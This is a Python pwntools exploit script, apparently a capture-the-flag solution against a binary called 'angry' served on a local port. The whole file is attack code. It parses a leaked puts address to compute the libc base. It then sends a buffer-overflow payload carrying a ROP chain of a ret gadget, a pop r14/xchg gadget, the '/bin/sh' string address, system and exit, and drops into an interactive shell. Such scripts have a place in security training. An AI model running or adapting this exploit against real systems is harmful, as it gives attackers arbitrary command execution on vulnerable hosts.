#!/usr/bin/env python3

from pwn import *
import warnings

warnings.filterwarnings("ignore")

exe = context.binary = ELF("./angry")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("127.0.0.1", 9988)

    return r


def main():
    r = conn()

    leaked_puts = int(r.recvuntil('\n').decode()[-15:], 16) 

    log.info(f'{hex(leaked_puts)=}')

    rop = ROP([exe])
    pop_r14_xchg = 0x4011ce # pop r14; xchg r14, rdi; ret;
    ret = rop.find_gadget(['ret'])[0]

    log.info(f'{hex(pop_r14_xchg)=}')
    log.info(f'{hex(ret)=}')

    libc.address = leaked_puts - libc.sym.puts 

    bin_sh = libc.search(b'/bin/sh').__next__()
    system = libc.sym.system
    exit = libc.sym.exit

    payload = b'A'*10 + b'\x00' + b'A'*61
    payload += p64(ret) 
    payload += p64(pop_r14_xchg)
    payload += p64(bin_sh)
    payload += p64(system) 
    payload += p64(exit)

    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
